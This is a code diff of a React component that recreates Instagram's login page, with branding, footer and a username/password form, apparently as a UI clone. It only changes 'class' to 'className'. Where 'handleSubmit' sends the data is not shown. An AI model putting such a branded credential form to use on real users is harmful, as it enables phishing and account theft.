@@ -65,29 +65,29 @@ function App() {
 
 
 
-        <main class="flex align-items-center justify-content-center">
-        <section id="mobile" class="flex">
+        <main className="flex align-items-center justify-content-center">
+        <section id="mobile" className="flex">
         </section>
-        <section id="auth" class="flex direction-column">
-            <div class="panel login flex direction-column">
-                <h1 title="Instagram" class="flex justify-content-center">
+        <section id="auth" className="flex direction-column">
+          <div className="panel login flex direction-column">
+            <h1 title="Instagram" className="flex justify-content-center">
                     <img src="/instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
                 <form>
-                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <label htmlFor="email" className="sr-only">Phone number, username, or email</label>
                     <input name="username" value={AddUserdata.username} onChange={handleChange} placeholder="Phone number, username, or email" />
 
-                    <label for="password" class="sr-only">Password</label>
+                    <label htmlFor="password" className="sr-only">Password</label>
                     <input name="password" type="password" value={AddUserdata.password} onChange={handleChange} placeholder="Password" />
 
                     <button type="button" onClick={handleSubmit}>Log in</button>
                 </form>
-                <div class="flex separator align-items-center">
+                <div className="flex separator align-items-center">
                     <span></span>
-                    <div class="or">OR</div>
+                    <div className="or">OR</div>
                     <span></span>
                 </div>
-                <div class="login-with-fb flex direction-column align-items-center">
+                <div className="login-with-fb flex direction-column align-items-center">
                     <div>
                         <img />
                         <a>Log in with Facebook</a>
@@ -95,13 +95,13 @@ function App() {
                     <a href="#">Forgot password?</a>
                 </div>
             </div>
-            <div class="panel register flex justify-content-center">
+            <div className="panel register flex justify-content-center">
                 <p>Don’t have an account?</p>
                 <a href="#">Sign up</a>
             </div>
-            <div class="app-download flex direction-column align-items-center">
+            <div className="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
-                <div class="flex justify-content-center">
+                <div className="flex justify-content-center">
                     <img src="/apple-button.png"      alt="Apple App Store logo" title="Apple App Store logo" />
                     <img src="/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                 </div>
@@ -109,7 +109,7 @@ function App() {
         </section>
     </main>
     <footer>
-        <ul class="flex flex-wrap justify-content-center">
+        <ul className="flex flex-wrap justify-content-center">
             <li><a href="#">ABOUT</a></li>
             <li><a href="#">HELP</a></li>
             <li><a href="#">PRESS</a></li>
@@ -122,7 +122,7 @@ function App() {
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
         </ul>
-        <p class="copyright">© 2020 Instagram from Facebook</p>
+        <p className="copyright">© 2020 Instagram from Facebook</p>
     </footer>
     </div>
   );
